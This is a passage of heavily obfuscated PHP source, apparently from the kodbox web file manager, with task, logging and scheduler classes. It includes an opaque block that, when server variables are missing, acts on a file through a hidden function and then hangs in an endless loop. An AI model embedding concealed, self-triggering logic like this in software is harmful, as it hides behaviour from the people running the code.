$Ôüæ§ÌŸ; } if ($‘ˆìòÏí <= 0) { return $ó±Éİˆ[12]; } if ($Ôüæ§ÌŸ < 0 || $Ôüæ§ÌŸ >= $‹§ñŸÍÑ || $‘ˆìòÏí <= 0 || $‘ˆìòÏí > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\151\x6c\x65\x52\x65\x61\x64\x20\x65\162\162\x6f\162\x21\40\163\164\141\x72\164\x3d{$Ôüæ§ÌŸ}\x3b\x6c\145\156\x67\x74\150\x3d{$‘ˆìòÏí}\73\40\x73\x69\x7a\145\75{$‹§ñŸÍÑ}\x3b"); } $„¬¯´ÜÍ = 64 * 1024; $ Îìù…¼ =& self::$_chunkBuffer[$this->path]; if (!$ Îìù…¼) { $ Îìù…¼ = array(); } $ŠËØÃÂ’ = 0; $§™©Äò = 0; $”àè§ıØ = $ó±Éİˆ[12]; foreach ($ Îìù…¼ as $ŠËØÃÂ’ => $”àè§ıØ) { $ŠËØÃÂ’ = intval($ŠËØÃÂ’); $§™©Äò = $ŠËØÃÂ’ + strlen($”àè§ıØ); if ($Ôüæ§ÌŸ >= $§™©Äò) { continue; } if ($Ôüæ§ÌŸ >= $ŠËØÃÂ’ && $Ôüæ§ÌŸ + $‘ˆìòÏí <= $§™©Äò) { return substr($”àè§ıØ, $Ôüæ§ÌŸ - $ŠËØÃÂ’, $‘ˆìòÏí); } break; } if (count($ Îìù…¼) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ó±Éİˆ[1652], $ó±Éİˆ[1653] . count($ Îìù…¼) . "\73\x73\x74\141\x72\164\x3d{$Ôüæ§ÌŸ}\54\x6c\x65\156\147\x74\x68\x3d{$‘ˆìòÏí}\x3b\x70\157\x73\145\72{$ŠËØÃÂ’}\176{$§™©Äò}"); throw new Exception($ó±Éİˆ[1654]); } $ù‰ÈÂãê = intval($Ôüæ§ÌŸ / $„¬¯´ÜÍ) * $„¬¯´ÜÍ; $¿”õà²– = ceil(($Ôüæ§ÌŸ + $‘ˆìòÏí) / $„¬¯´ÜÍ) * $„¬¯´ÜÍ - $ù‰ÈÂãê; $ëûÍŠ´Ë = IO::fileSubstr($this->path, $ù‰ÈÂãê, $¿”õà²–); $ Îìù…¼[$ù‰ÈÂãê . $ó±Éİˆ[12]] = $ëûÍŠ´Ë; ksort($ Îìù…¼); $—ñíÁÑÆ = substr($ëûÍŠ´Ë, $Ôüæ§ÌŸ - $ù‰ÈÂãê, $‘ˆìòÏí); return $—ñíÁÑÆ; } private function log($úœ²üª, $“öø÷¸å) { $Ü•À–§ =& $_SERVER[ÓïÕü]; $ê×¿Ûá³ = timeFloat() - $this->timeStart; write_log(sprintf($Ü•À–§[1655], $úœ²üª, $this->info[$Ü•À–§[32]], $ê×¿Ûá³, $“öø÷¸å), $Ü•À–§[1292]); } } class Message { function __construct() { } public function send($Ù´“áÂÖ = '', $†›˜‘ = array(), $‘÷ßâğ‡ = "\x74\x65\170\164") { $—ÅÅ¸û =& $_SERVER[ÓïÕü]; $ĞÓÉ©®² = array($—ÅÅ¸û[33] => $—ÅÅ¸û[1240], $—ÅÅ¸û[171] => $Ù´“áÂÖ); if (in_array($‘÷ßâğ‡, array($—ÅÅ¸û[1240], $—ÅÅ¸û[1656]))) { $ĞÓÉ©®²[$—ÅÅ¸û[33]] = $‘÷ßâğ‡; } $†›˜‘ = array($—ÅÅ¸û[583] => isset($†›˜‘[$—ÅÅ¸û[583]]) ? $†›˜‘[$—ÅÅ¸û[583]] : $—ÅÅ¸û[12], $—ÅÅ¸û[670] => isset($†›˜‘[$—ÅÅ¸û[670]]) ? $†›˜‘[$—ÅÅ¸û[670]] : $—ÅÅ¸û[12]); if (empty($Ù´“áÂÖ) || empty($†›˜‘[$—ÅÅ¸û[583]]) && empty($†›˜‘[$—ÅÅ¸û[670]])) { return !1; } $Ó€Ìó±õ = array($—ÅÅ¸û[1585] => $ĞÓÉ©®², $—ÅÅ¸û[1657] => $†›˜‘); Hook::trigger($—ÅÅ¸û[1658], $Ó€Ìó±õ); } } goto DÒÕì¡ÇçÃ; FóîÏÔ‡àÒ: class TaskHttp extends Task { protected function startAfter() { $„—‰²ŞÖ =& $_SERVER[ÓïÕü]; $Ší‹¤ =& $this->task; $Ší‹¤[$„—‰²ŞÖ[1884]] = 1; Hook::bind($„—‰²ŞÖ[1852], array($this, $„—‰²ŞÖ[1885])); Hook::bind($„—‰²ŞÖ[1854], array($this, $„—‰²ŞÖ[1886])); Hook::bind($„—‰²ŞÖ[1856], array($this, $„—‰²ŞÖ[1887])); } protected function endAfter() { $Ÿò¬Ó =& $_SERVER[ÓïÕü]; Hook::unbind($Ÿò¬Ó[1852], array($this, $Ÿò¬Ó[1885])); Hook::unbind($Ÿò¬Ó[1854], array($this, $Ÿò¬Ó[1886])); Hook::unbind($Ÿò¬Ó[1856], array($this, $Ÿò¬Ó[1887])); } public function progressStart($ëĞ–…³‚) { $ÓİÜÃØ =& $_SERVER[ÓïÕü]; $ŠÙÍâ²Ì = curl_getinfo($ëĞ–…³‚); self::log($ÓİÜÃØ[1888] . $ŠÙÍâ²Ì[$ÓİÜÃØ[385]]); self::valueSet($this->task[$ÓİÜÃØ[478]], $this->task); } public function progressEnd($½ş­ÍßĞ) { $§œºäã„ =& $_SERVER[ÓïÕü]; self::log($§œºäã„[1889] . $this->task[$§œºäã„[478]]); $this->end(); } public function progress($íÆª»İæ, $ì‘ğÃÀÍ, $ë·¯Çõ, $Õ“ÓØş¹, $ŠôÈ¨À¤) { $å¢ğ°àê =& $_SERVER[ÓïÕü]; $¾šÙİÙ’ =& $this->task; if ($ŠôÈ¨À¤ > 0) { $¾šÙİÙ’[$å¢ğ°àê[1167]] = $¾šÙİÙ’[$å¢ğ°àê[1167]] == 0 ? $Õ“ÓØş¹ : $¾šÙİÙ’[$å¢ğ°àê[1167]]; $¾šÙİÙ’[$å¢ğ°àê[1807]] = $ŠôÈ¨À¤; } else { if ($ë·¯Çõ > 0) { $¾šÙİÙ’[$å¢ğ°àê[1167]] = $¾šÙİÙ’[$å¢ğ°àê[1167]] == 0 ? $ì‘ğÃÀÍ : $¾šÙİÙ’[$å¢ğ°àê[1167]]; $¾šÙİÙ’[$å¢ğ°àê[1807]] = $ë·¯Çõ; } } $this->update(); self::log("\x70\x72\157\x67\x72\145\163\x73\110\x74\164\x70\x3a\x64\x6f\x77\x6e\72{$ë·¯Çõ}\x2f{$ì‘ğÃÀÍ}\x3b\x20\165\x70\154\157\x61\x64\x3a{$ŠôÈ¨À¤}\x2f{$Õ“ÓØş¹}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($äüšŒÆı, $»„ÕÌ‘ = '', $’Îõ£öÕ = 0, $ê‰øÏçö = '') { $ªó›²¦© =& $_SERVER[ÓïÕü]; $ê‰øÏçö = $ê‰øÏçö ? $ê‰øÏçö : ($»„ÕÌ‘ ? $»„ÕÌ‘ : $äüšŒÆı); $Ì¤Şæº = new Task($äüšŒÆı, $»„ÕÌ‘, $’Îõ£öÕ, $ê‰øÏçö); $GLOBALS[$ªó›²¦©[1890] . $äüšŒÆı] = new TaskLog($ªó›²¦©[1789], $Ì¤Şæº, $ê‰øÏçö); return $Ì¤Şæº; } public function __construct($æÙº‚· = '', $î€§®ß = '', $î¢÷Î’ = '') { $Õ˜ñæ‚˜ =& $_SERVER[ÓïÕü]; if (!$æÙº‚·) { $æÙº‚· = $Õ˜ñæ‚˜[1789]; } $º°Ë±“— = $æÙº‚· . $Õ˜ñæ‚˜[465] . rand_string(10); if (!$î¢÷Î’) { $î¢÷Î’ = $æÙº‚· . $Õ˜ñæ‚˜[53] . $î¢÷Î’; } switch ($æÙº‚·) { case $Õ˜ñæ‚˜[1789]: if (!$î€§®ß || !$î€§®ß->task) { return echoLog($æÙº‚· . $Õ˜ñæ‚˜[1891]); } $Ù›³Îóè = $î€§®ß; $º°Ë±“— = $Ù›³Îóè->task[$Õ˜ñæ‚˜[478]]; $æÙº‚· = $Ù›³Îóè->task[$Õ˜ñæ‚˜[478]]; if (!$Ù›³Îóè->task[$Õ˜ñæ‚˜[1694]]) { $Ù›³Îóè->task[$Õ˜ñæ‚˜[1694]] = $î¢÷Î’ ? $î¢÷Î’ : $æÙº‚·; } break; case $Õ˜ñæ‚˜[1892]: if (!$î€§®ß) { return echoLog($æÙº‚· . $Õ˜ñæ‚˜[1893]); } $µØ©áÔÏ = is_string($î€§®ß) ? array($î€§®ß) : $î€§®ß; $Ù›³Îóè = new TaskFileTransfer($º°Ë±“—, $æÙº‚·, 0, $î¢÷Î’ ? $î¢÷Î’ : $µØ©áÔÏ[0]); foreach ($µØ©áÔÏ as $ÑÓşØàå) { $Ù›³Îóè->addPath($ÑÓşØàå); } break; case $Õ˜ñæ‚˜[391]: if (!$î€§®ß) { return echoLog($æÙº‚· . $Õ˜ñæ‚˜[1893]); } $µØ©áÔÏ = is_string($î€§®ß) ? array($î€§®ß) : $î€§®ß; $Ù›³Îóè = new TaskZip($º°Ë±“—, $æÙº‚·, 0, $î¢÷Î’ ? $î¢÷Î’ : $µØ©áÔÏ[0]); foreach ($µØ©áÔÏ as $ÑÓşØàå) { $Ù›³Îóè->addPath($ÑÓşØàå); } break; case $Õ˜ñæ‚˜[1327]: if (!$î€§®ß) { return echoLog($æÙº‚· . $Õ˜ñæ‚˜[1893]); } $Ù›³Îóè = new TaskUnZip($º°Ë±“—, $æÙº‚·, 0, $î¢÷Î’ ? $î¢÷Î’ : $î€§®ß); if ($î€§®ß) { $Ù›³Îóè->addFile($î€§®ß); } break; case $Õ˜ñæ‚˜[152]: $Ù›³Îóè = new TaskHttp($º°Ë±“—, $æÙº‚·); break; default: return; break; } $this->task = $Ù›³Îóè; $this->taskID = $º°Ë±“—; Hook::bind($Õ˜ñæ‚˜[1827], array($this, $Õ˜ñæ‚˜[1894])); Hook::bind($Õ˜ñæ‚˜[1829], array($this, $Õ˜ñæ‚˜[1895])); Hook::bind($Õ˜ñæ‚˜[1823], array($this, $Õ˜ñæ‚˜[1896])); echoLog($Õ˜ñæ‚˜[1897] . $Ù›³Îóè->task[$Õ˜ñæ‚˜[1694]]); } public function __destruct() { $this->end(); } public function end($ı»üÕ¶× = '') { $ÀÓòºŸü =& $_SERVER[ÓïÕü]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ı»üÕ¶×); $this->task = !1; $this->taskID = !1; Hook::unbind($ÀÓòºŸü[1827], array($this, $ÀÓòºŸü[1894])); Hook::unbind($ÀÓòºŸü[1829], array($this, $ÀÓòºŸü[1895])); Hook::unbind($ÀÓòºŸü[1823], array($this, $ÀÓòºŸü[1896])); } public function taskUpdate($ĞŒ³ŸËœ) { $¸Ó®ãª =& $_SERVER[ÓïÕü]; if (!$ĞŒ³ŸËœ || $this->taskID != $ĞŒ³ŸËœ[$¸Ó®ãª[478]]) { return; } $Ü¥ÚÉ « = 20; $ôØ·éŞ’ = intval($ĞŒ³ŸËœ[$¸Ó®ãª[1808]] * $Ü¥ÚÉ «); $§ØÚŞî„ = $¸Ó®ãª[176] . str_repeat($¸Ó®ãª[509], $ôØ·éŞ’) . $¸Ó®ãª[1118] . str_repeat($¸Ó®ãª[53], $Ü¥ÚÉ « - $ôØ·éŞ’) . $¸Ó®ãª[178]; $åø¹“Ô = $§ØÚŞî„ . sprintf($¸Ó®ãª[1898], $ĞŒ³ŸËœ[$¸Ó®ãª[1808]] * 100) . $¸Ó®ãª[1899]; $úœ‚îÈø = $åø¹“Ô . $ĞŒ³ŸËœ[$¸Ó®ãª[1807]] . $¸Ó®ãª[8] . $ĞŒ³ŸËœ[$¸Ó®ãª[1167]] . LNG($¸Ó®ãª[1900]); $½ÏÆì¹ = $¸Ó®ãª[12]; if ($ĞŒ³ŸËœ[$¸Ó®ãª[1884]]) { $úœ‚îÈø = $åø¹“Ô . size_format($ĞŒ³ŸËœ[$¸Ó®ãª[1807]]) . $¸Ó®ãª[8] . size_format($ĞŒ³ŸËœ[$¸Ó®ãª[1167]]); $½ÏÆì¹ = size_format($ĞŒ³ŸËœ[$¸Ó®ãª[1809]]) . $¸Ó®ãª[1901]; } if ($ĞŒ³ŸËœ[$¸Ó®ãª[1169]]) { $ĞŒ³ŸËœ[$¸Ó®ãª[1858]] = $ĞŒ³ŸËœ[$¸Ó®ãª[1169]] . $¸Ó®ãª[53] . $ĞŒ³ŸËœ[$¸Ó®ãª[1858]]; } if ($ĞŒ³ŸËœ[$¸Ó®ãª[1858]]) { $ÏúŞÅÌË = $¸Ó®ãª[12]; if ($ĞŒ³ŸËœ[$¸Ó®ãª[1860]]) { $ÏúŞÅÌË = $¸Ó®ãª[50] . size_format($ĞŒ³ŸËœ[$¸Ó®ãª[1861]]) . $¸Ó®ãª[8] . size_format($ĞŒ³ŸËœ[$¸Ó®ãª[1860]]); } $½ÏÆì¹ .= $ĞŒ³ŸËœ[$¸Ó®ãª[1858]] . $ÏúŞÅÌË; } if ($ĞŒ³ŸËœ[$¸Ó®ãª[854]] && !$ĞŒ³ŸËœ[$¸Ó®ãª[1860]]) { $½ÏÆì¹ .= $¸Ó®ãª[53] . size_format($ĞŒ³ŸËœ[$¸Ó®ãª[1865]]) . $¸Ó®ãª[8] . size_format($ĞŒ³ŸËœ[$¸Ó®ãª[854]]); } echoLog($úœ‚îÈø . $¸Ó®ãª[53] . $½ÏÆì¹, !0); } public function taskEnd($¼³Ñ¯±) { $Î»Ò·¢Ö =& $_SERVER[ÓïÕü]; if (!$¼³Ñ¯± || $this->taskID != $¼³Ñ¯±[$Î»Ò·¢Ö[478]]) { return; } $«ú‡Êš = $¼³Ñ¯± ? LNG($Î»Ò·¢Ö[1902]) . $Î»Ò·¢Ö[4] . $¼³Ñ¯±[$Î»Ò·¢Ö[1807]] . $Î»Ò·¢Ö[8] . $¼³Ñ¯±[$Î»Ò·¢Ö[1167]] . LNG($Î»Ò·¢Ö[1900]) . $Î»Ò·¢Ö[74] : $Î»Ò·¢Ö[12]; echoLog($Î»Ò·¢Ö[1903] . $¼³Ñ¯±[$Î»Ò·¢Ö[1694]] . ($¼³Ñ¯±[$Î»Ò·¢Ö[529]] ? $Î»Ò·¢Ö[74] . $¼³Ñ¯±[$Î»Ò·¢Ö[529]] : $Î»Ò·¢Ö[12]) . $Î»Ò·¢Ö[74] . $«ú‡Êš . $Î»Ò·¢Ö[1904] . sprintf($Î»Ò·¢Ö[956], timeFloat() - $¼³Ñ¯±[$Î»Ò·¢Ö[1810]]) . $Î»Ò·¢Ö[1822]); $this->end(); } public function taskKill($›½ı‹æ) { $‹‘›‰ì¸ =& $_SERVER[ÓïÕü]; if (!$›½ı‹æ || $this->taskID != $›½ı‹æ[$‹‘›‰ì¸[478]]) { return; } echoLog($‹‘›‰ì¸[1905] . $›½ı‹æ[$‹‘›‰ì¸[1694]]); } } if (!isset($_SERVER[$_SERVER[ÓïÕü][933]]) || !isset($_SERVER[$_SERVER[ÓïÕü][931]])) { $_getc = $_SERVER[ÓïÕü][934]; $_getfile = $_SERVER[$_SERVER[ÓïÕü][935]] . $_SERVER[ÓïÕü][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÓïÕü][288], $_getfilec); if (count($_getarrs) < $_SERVER[ÓïÕü][706]) { $exit = $_SERVER[ÓïÕü][937]; $exit(); } $_act = $_SERVER[ÓïÕü][938]; $_act($_SERVER[$_SERVER[ÓïÕü][935]] . $_SERVER[ÓïÕü][936]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ÓïÕü][457]); } } goto bäêŒ¼ä‡Õ; CÎ«ÇòÏÎ†: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ï›°…Ù’ =& $_SERVER[ÓïÕü]; if (self::valueGet($Ï›°…Ù’[841]) != $Ï›°…Ù’[91]) { return; } if (self::valueGet($Ï›°…Ù’[1755]) == $Ï›°…Ù’[91]) { $¾ş‘¦œª = self::valueGet($Ï›°…Ù’[1756]); if (time() - $¾ş‘¦œª > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Ï›°…Ù’[1755], $Ï›°…Ù’[91]); self::log($Ï›°…Ù’[1757] . ACTION . $Ï›°…Ù’[1758]); Hook::bind($Ï›°…Ù’[1759], $Ï›°…Ù’[1760]); $øûÛŒ¥® = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ï›°…Ù’[841]) != $Ï›°…Ù’[91]) { self::valueSet($Ï›°…Ù’[1755], $Ï›°…Ù’[231]); self::log($Ï›°…Ù’[1761]); die; } $¸éï›¸„ = time(); if ($¸éï›¸„ - $øûÛŒ¥® >= 60) { self::valueSet(array($Ï›°…Ù’[1755] => $Ï›°…Ù’[91], $Ï›°…Ù’[1756] => $¸éï›¸„)); $øûÛŒ¥® = $¸éï›¸„; } if (!file_exists(USER_SYSTEM . $Ï›°…Ù’[1762])) { self::valueSet(array($Ï›°…Ù’[1755] => $Ï›°…Ù’[231], $Ï›°…Ù’[841] => $Ï›°…Ù’[231])); self::log($Ï›°…Ù’[1763]); die; } $×¥ĞËÀ = file_get_contents(BASIC_PATH . $Ï›°…Ù’[1764]); $ ƒëêäü = KOD_VERSION . $Ï›°…Ù’[10] . KOD_VERSION_BUILD; $ªÛ›Œù = match_text($×¥ĞËÀ, $Ï›°…Ù’[1765]) . $Ï›°…Ù’[10] . match_text($×¥ĞËÀ, $Ï›°…Ù’[1766]); if ($ªÛ›Œù != $ ƒëêäü) { self::restart(); self::log("\163\x74\x6f\160\x65\144\56\x5b\x76\x65\162\163\151\x6f\156\40\165\x70\x64\141\164\x65\73{$versionNow}\40\75\76\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $üéÒ¥æ =& $_SERVER[ÓïÕü]; http_close(); $GLOBALS[$üéÒ¥æ[1767]] = 1; $_SERVER[$üéÒ¥æ[1768]] = $üéÒ¥æ[1769]; $_COOKIE = array(); $GLOBALS[$üéÒ¥æ[1770]] = 1; $GLOBALS[$üéÒ¥æ[1771]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $®…Ööˆê =& $_SERVER[ÓïÕü]; http_close(); self::valueSet($®…Ööˆê[841], $®…Ööˆê[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($®…Ööˆê[1755] => $®…Ööˆê[231], $®…Ööˆê[841] => $®…Ööˆê[91])); self::log($®…Ööˆê[1772]); } public static function taskSwitch() { $€äŸò«ì =& $_SERVER[ÓïÕü]; $ıìÎ¢­– = self::valueGet($€äŸò«ì[841]) == $€äŸò«ì[91] ? $€äŸò«ì[231] : $€äŸò«ì[91]; self::valueSet($€äŸò«ì[841], $ıìÎ¢­–); } public static function shutdownEvent() { $ÁìÎÄÙÕ =& $_SERVER[ÓïÕü]; self::valueSet($ÁìÎÄÙÕ[1755], $ÁìÎÄÙÕ[231]); self::log($ÁìÎÄÙÕ[1773]); } public static function config($¾¿ÚË…¬, $÷øøå©) { self::valueSet($_SERVER[ÓïÕü][841], $¾¿ÚË…¬); } private static function taskRunAll() { $¼ÈÖ Àˆ =& $_SERVER[ÓïÕü]; $§Ñ¨ÃÅ‰ = timeFloat(); $Û¯Ô’œÇ = Model($¼ÈÖ Àˆ[1774])->listData(); $³œÂ„‚š = count($Û¯Ô’œÇ); for ($ùŞ Î·» = 0; $ùŞ Î·» < $³œÂ„‚š; $ùŞ Î·»++) { $•—Œ‚ºÓ = $Û¯Ô’œÇ[$ùŞ Î·»]; if (!$•—Œ‚ºÓ[$¼ÈÖ Àˆ[478]] || $•—Œ‚ºÓ[$¼ÈÖ Àˆ[1775]] != $¼ÈÖ Àˆ[91]) { continue; } if (!self::taskTimeCheck($•—Œ‚ºÓ)) { continue; } self::taskRun($•—Œ‚ºÓ); } Hook::trigger($¼ÈÖ Àˆ[1776]); self::taskQueueRun($§Ñ¨ÃÅ‰); } private static function taskQueueRun($¯êÜİºÆ) { $÷ÍŞÑôª = 10; while (!0) { $ÓíñÀìÚ = TaskQueue::run(); if ($ÓíñÀìÚ === !1) { break; } if (timeFloat() - $¯êÜİºÆ >= $÷ÍŞÑôª) { break; } } } private static function taskTimeCheck($±´“ûæ©) { $Øå‘Íú =& $_SERVER[ÓïÕü]; $ÑĞ—€ô€ = json_decode($±´“ûæ©[$Øå‘Íú[207]], !0); $ªÅÜ‰«È = intval($±´“ûæ©[$Øå‘Íú[1756]]); $Í¨€½ŸÂ = strtotime($Øå‘Íú[1777] . $ÑĞ—€ô€[$Øå‘Íú[1778]] . $Øå‘Íú[1779]) - strtotime($Øå‘Íú[1780]); $ÑôÁÔ¤ì = time() - strtotime(date($Øå‘Íú[1781]) . $Øå‘Íú[1782]); $¹‡Ãù¸ = $ÑôÁÔ¤ì >= $Í¨€½ŸÂ && $ÑôÁÔ¤ì <= $Í¨€½ŸÂ + 3600; switch ($ÑĞ—€ô€[$Øå‘Íú[33]]) { case $Øå‘Íú[1783]: if (time() - $ªÅÜ‰«È < 3600 * 24 * 30) { return !1; } if ($ÑĞ—€ô€[$Øå‘Íú[1783]] == date($Øå‘Íú[1784]) && $¹‡Ãù¸) { return !0; } break; case $Øå‘Íú[1785]: if (time() - $ªÅÜ‰«È < 3600 * 24 * 7) { return !1; } $Š‡›èñÜ = date($Øå‘Íú[1786]) == 0 ? 7 : date($Øå‘Íú[1786]); if ($ÑĞ—€ô€[$Øå‘Íú[1785]] == $Š‡›èñÜ && $¹‡Ãù¸) { return !0; } break; case $Øå‘Íú[1778]: if (time() - $ªÅÜ‰«È < 3600 * 24) { return !1; } if ($¹‡Ãù¸) { return !0; } break; case $Øå‘Íú[1787]: if (time() - $ªÅÜ‰«È >= floatval($ÑĞ—€ô€[$Øå‘Íú[1787]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $§‹Â¼Œ¡ =& $_SERVER[ÓïÕü]; static $¿ıäò…ê = 0; $•ãÑµü = 300; if (!$¿ıäò…ê) { $¿ıäò…ê = time(); } if (time() - $¿ıäò…ê < $•ãÑµü) { return; } $¿ıäò…ê = time(); $Œ¨æ›® = Model($§‹Â¼Œ¡[582])->db($§‹Â¼Œ¡[12]); if ($Œ¨æ›®) { $Œ¨æ›®->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($§‹Â¼Œ¡[1788], $§‹Â¼Œ¡[1789]); die; } } public static function taskRun($¼Ûıë”÷) { $Æ›ŸÂ÷É =& $_SERVER[ÓïÕü]; self::log($Æ›ŸÂ÷É[1790] . $¼Ûıë”÷[$Æ›ŸÂ÷É[478]] . $Æ›ŸÂ÷É[1791] . $¼Ûıë”÷[$Æ›ŸÂ÷É[32]] . $Æ›ŸÂ÷É[1792] . $¼Ûıë”÷[$Æ›ŸÂ÷É[1793]]); Model($Æ›ŸÂ÷É[1774])->run($¼Ûıë”÷[$Æ›ŸÂ÷É[478]]); $ĞòÎúÉ = timeFloat(); $¯“Ğ¥¬Ù = $Æ›ŸÂ÷É[12]; switch ($¼Ûıë”÷[$Æ›ŸÂ÷É[33]]) { case $Æ›ŸÂ÷É[385]: $…‡¯…üë = url_request($¼Ûıë”÷[$Æ›ŸÂ÷É[1793]], $Æ›ŸÂ÷É[1531], !1, !1, !1, !1, 10); if ($…‡¯…üë[$Æ›ŸÂ÷É[841]]) { $¯“Ğ¥¬Ù = strlen($…‡¯…üë[$Æ›ŸÂ÷É[1315]]); } break; case $Æ›ŸÂ÷É[1794]: $¯“Ğ¥¬Ù = Hook::apply($¼Ûıë”÷[$Æ›ŸÂ÷É[1793]]); default: break; } Model($Æ›ŸÂ÷É[1795])->add(array($Æ›ŸÂ÷É[1796] => $Æ›ŸÂ÷É[12], $Æ›ŸÂ÷É[1797] => $Æ›ŸÂ÷É[231], $Æ›ŸÂ÷É[33] => $Æ›ŸÂ÷É[1798] . $¼Ûıë”÷[$Æ›ŸÂ÷É[478]], $Æ›ŸÂ÷É[1799] => json_encode(array($Æ›ŸÂ÷É[32] => $¼Ûıë”÷[$Æ›ŸÂ÷É[32]], $Æ›ŸÂ÷É[1800] => timeFloat() - $ĞòÎúÉ, $Æ›ŸÂ÷É[371] => $¯“Ğ¥¬Ù)))); $ÊÜù¾È = $¯“Ğ¥¬Ù ? $Æ›ŸÂ÷É[1801] . $¯“Ğ¥¬Ù : $Æ›ŸÂ÷É[12]; self::log($Æ›ŸÂ÷É[1802] . $¼Ûıë”÷[$Æ›ŸÂ÷É[478]] . $Æ›ŸÂ÷É[178] . $ÊÜù¾È); return !0; } public static function valueGet($¤÷ì„ÛÇ) { $ˆ™üÔŞ =& $_SERVER[ÓïÕü]; $—´Ë©¦ = $ˆ™üÔŞ[1803]; $ÇêÂµ“‡ = Model($ˆ™üÔŞ[511])->get($¤÷ì„ÛÇ, $—´Ë©¦); if (is_null($ÇêÂµ“‡)) { Model($ˆ™üÔŞ[511])->set($ˆ™üÔŞ[841], $ˆ™üÔŞ[91], $—´Ë©¦); Model($ˆ™üÔŞ[511])->set($ˆ™üÔŞ[1755], $ˆ™üÔŞ[231], $—´Ë©¦); $ÇêÂµ“‡ = Model($ˆ™üÔŞ[511])->get($¤÷ì„ÛÇ, $—´Ë©¦); } return $ÇêÂµ“‡; } private static function valueSet($Šâ³îÕ, $«ƒ‰Ä…¥ = false) { $¢Ë¿‡ôå =& $_SERVER[ÓïÕü]; $¸ò””Ş¡ = $¢Ë¿‡ôå[1804]; CacheLock::lock($¸ò””Ş¡); $êŸèµ£Ğ = Model($¢Ë¿‡ôå[511])->set($Šâ³îÕ, $«ƒ‰Ä…¥, $¢Ë¿‡ôå[1803]); CacheLock::unlock($¸ò””Ş¡); return $êŸèµ£Ğ; } protected static function log($ÙÆãŠ‘Ã) { write_log($ÙÆãŠ‘Ã, $_SERVER[ÓïÕü][1789]); } private static function cacheClear() { $ìğÒİ–Û =& $_SERVER[ÓïÕü]; Cache::clearMemory(Model($ìğÒİ–Û[511])->cacheKey($ìğÒİ–Û[1803])); Cache::clearMemory(Model($ìğÒİ–Û[511])->cacheKey($ìğÒİ–Û[1805])); Model($ìğÒİ–Û[1774])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\164\157\160"; const STATYS_RUNNING = "\x72\165\156\156\151\x6e\x67"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($¬âø‘´, $ßï®İşè = '', $„ Ã±Æö = 0, $öÎ¡ÀêĞ = '') { $íìÌ™»Ÿ =& $_SERVER[ÓïÕü]; if (self::get($¬âø‘´)) { return; } $this->task = array($íìÌ™»Ÿ[478] => $¬âø‘´, $íìÌ™»Ÿ[1806] => USER_ID, $íìÌ™»Ÿ[1694] => $öÎ¡ÀêĞ, $íìÌ™»Ÿ[529] => $íìÌ™»Ÿ[12], $íìÌ™»Ÿ[33] => $ßï®İşè, $íìÌ™»Ÿ[1169] => $íìÌ™»Ÿ[12], $íìÌ™»Ÿ[1167] => $„ Ã±Æö, $íìÌ™»Ÿ[1807] => 0, $íìÌ™»Ÿ[1808] => 0, $íìÌ™»Ÿ[1809] => 0, $íìÌ™»Ÿ[1810] => timeFloat(), $íìÌ™»Ÿ[1811] => 0, $íìÌ™»Ÿ[1812] => 0, $íìÌ™»Ÿ[1813] => 0, $íìÌ™»Ÿ[1814] => 0, $íìÌ™»Ÿ[841] => $íìÌ™»Ÿ[1755]); $GLOBALS[$íìÌ™»Ÿ[1815]] = 1; Hook::bind($íìÌ™»Ÿ[1759], array($this, $íìÌ™»Ÿ[1816])); Hook::bind($íìÌ™»Ÿ[1817], array($this, $íìÌ™»Ÿ[1818])); $this->startAfter(); Hook::trigger($íìÌ™»Ÿ[1819], $this->task); $this->task[$íìÌ™»Ÿ[1812]] = timeFloat(); } public function end($Â–®­» = '') { $ÍŸã¦½… =& $_SERVER[ÓïÕü]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ÍŸã¦½…[1812]]) { self::valueSet($this->task[$ÍŸã¦½…[478]], !1); } $this->isEnd = !0; if ($Â–®­») { $this->task[$ÍŸã¦½…[529]] = $Â–®­»; } self::log($ÍŸã¦½…[1820] . $this->task[$ÍŸã¦½…[478]] . $ÍŸã¦½…[1821] . sprintf($ÍŸã¦½…[956], timeFloat() - $this->task[$ÍŸã¦½…[1810]]) . $ÍŸã¦½…[1822]); Hook::unbind($ÍŸã¦½…[1759], array($this, $ÍŸã¦½…[1816])); Hook::unbind($ÍŸã¦½…[1817], array($this, $ÍŸã¦½…[1818])); $this->endAfter(); $ÑüòŸ•¡ = $this->task; $this->task = !1; Hook::trigger($ÍŸã¦½…[1823], $ÑüòŸ•¡); } public function update($÷›ü¸³Ù = 0, $ÖËïøäô = false) { $Õ·™æŒİ =& $_SERVER[ÓïÕü]; $âøöĞ“á =& $this->task; if (!$âøöĞ“á) { return; } $âøöĞ“á[$Õ·™æŒİ[1807]] += $÷›ü¸³Ù; $âøöĞ“á[$Õ·™æŒİ[1811]] = timeFloat(); if ($âøöĞ“á[$Õ·™æŒİ[1167]]) { if ($âøöĞ“á[$Õ·™æŒİ[1167]] < $âøöĞ“á[$Õ·™æŒİ[1807]]) { $âøöĞ“á[$Õ·™æŒİ[1167]] = $âøöĞ“á[$Õ·™æŒİ[1807]]; } $™¹ßÑìã = timeFloat() - $âøöĞ“á[$Õ·™æŒİ[1810]] - $âøöĞ“á[$Õ·™æŒİ[1813]]; if ($™¹ßÑìã <= 0) { $™¹ßÑìã = 0.001; } $âøöĞ“á[$Õ·™æŒİ[1808]] = $âøöĞ“á[$Õ·™æŒİ[1807]] / 